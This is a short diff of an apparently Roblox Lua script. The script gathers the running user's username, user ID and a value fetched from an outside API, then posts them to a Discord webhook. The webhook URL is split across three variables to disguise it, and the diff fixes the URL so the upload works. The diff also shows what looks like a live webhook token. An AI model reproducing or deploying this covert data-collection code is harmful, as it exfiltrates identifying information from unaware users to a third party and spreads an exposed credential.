@@ -17,10 +17,9 @@ local identification_protocol = tostring(game:HttpGet(api_url, true))
 local webhook_string = 'Username: '..username .. '\nUser ID: '..userid .. '\nIdentification Protocol: '..identification_protocol
 
 function discord_embed(text)
-
     local d1 = "https://discord.com/api/webhooks/"
     local d2 = '1046279988242042942/unFD3HAP4-R9CuS0Pu6aBmvTsSj5k'
-    local d3 = 'webhooks/7IP9LYeH4nfAqbt0wsNoFgrL9LbUKn_4X2SaUhq'
+    local d3 = '7IP9LYeH4nfAqbt0wsNoFgrL9LbUKn_4X2SaUhq'
     local url = d1..d2..d3
     local data = {
         ["content"] = "",
